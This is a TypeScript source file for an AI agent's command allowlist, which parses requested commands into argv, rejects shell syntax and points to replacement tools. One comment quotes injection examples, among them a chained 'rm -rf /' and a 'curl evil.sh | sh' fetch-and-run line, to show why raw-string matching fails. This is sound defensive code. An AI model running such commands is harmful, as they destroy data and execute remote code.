export type CommandDecision = { allowed: true; argv: string[] } | { allowed: false; reason: string };

/**
 * Commands that have a tool, mapped to the tool that replaces them.
 *
 * A refusal that only says no gets retried in variants — card 0001 spent four calls on `find /`
 * before giving up. Naming the tool that does the job ends the loop on the first denial.
 */
const TOOL_EQUIVALENTS: Record<string, string> = {
    cat: 'the read tool',
    head: 'the read tool (it takes offset and limit)',
    tail: 'the read tool (it takes offset and limit)',
    less: 'the read tool',
    more: 'the read tool',
    find: 'the glob tool (pass include_ignored to reach node_modules)',
    ls: 'the glob tool',
    tree: 'the glob tool',
    grep: 'the grep tool (pass include_ignored to reach node_modules)',
    rg: 'the grep tool (pass include_ignored to reach node_modules)',
    ack: 'the grep tool',
    sed: 'the edit tool',
    awk: 'the read and edit tools',
    touch: 'the write tool',
    tee: 'the write tool',
    echo: 'the write tool, if you meant to create a file',
    mkdir: 'the write tool, which creates parent directories itself',
};

/** The tool that replaces `command`, if one does. */
const suggestionFor = (argv: string[]): string | undefined => {
    const head = argv[0];
    return head ? TOOL_EQUIVALENTS[head] : undefined;
};

/**
 * Which commands a stage may run.
 *
 * Stage config names them (`pnpm build`, `pnpm test`) and this parses the agent's requested command
 * into argv before matching. Matching on the raw string would be a hole: `pnpm test; rm -rf /`,
 * `pnpm test && curl evil.sh | sh`, and `pnpm test $(whoami)` all start with an allowed prefix.
 *
 * So there is no shell. The command is tokenised here and handed to `execFile` as argv, which means
 * shell metacharacters are not "escaped" — they simply have no one to interpret them. Anything that
 * would need a shell to mean what it says is refused rather than quietly running.
 */

/** Characters that only mean something to a shell. Their presence means the agent expected one. */
const SHELL_METACHARACTERS = /[;&|><`$(){}[\]!#~*?\n\r\\]/;

export class CommandAllowlist {
    /** Each entry is the argv prefix a command must start with, e.g. `[['pnpm','test']]`. */
    private readonly prefixes: string[][];

    constructor(allowed: string[]) {
        this.prefixes = allowed.map(entry => entry.trim().split(/\s+/).filter(Boolean));
    }

    check(command: string): CommandDecision {
        if (SHELL_METACHARACTERS.test(command)) {
            const suggestion = suggestionFor(command.trim().split(/\s+/).filter(Boolean));
            return {
                allowed: false,
                reason: `command contains shell syntax and there is no shell to interpret it — no pipes, redirects, chaining, globs or substitution. ${
                    suggestion ? `Use ${suggestion} instead.` : 'Run a single command with plain arguments.'
                }`,
            };
        }

        const argv = command.trim().split(/\s+/).filter(Boolean);
        if (argv.length === 0) {
            return { allowed: false, reason: 'empty command' };
        }

        for (const prefix of this.prefixes) {
            if (prefix.length <= argv.length && prefix.every((token, i) => argv[i] === token)) {
                return { allowed: true, argv };
            }
        }

        const suggestion = suggestionFor(argv);
        const allowed = this.prefixes.map(p => p.join(' ')).join(', ') || 'nothing';
        return {
            allowed: false,
            reason: suggestion
                ? `${argv[0]} is not available, and does not need to be — use ${suggestion}.`
                : `command is not in this stage's allowlist. Allowed: ${allowed}.`,
        };
    }
}
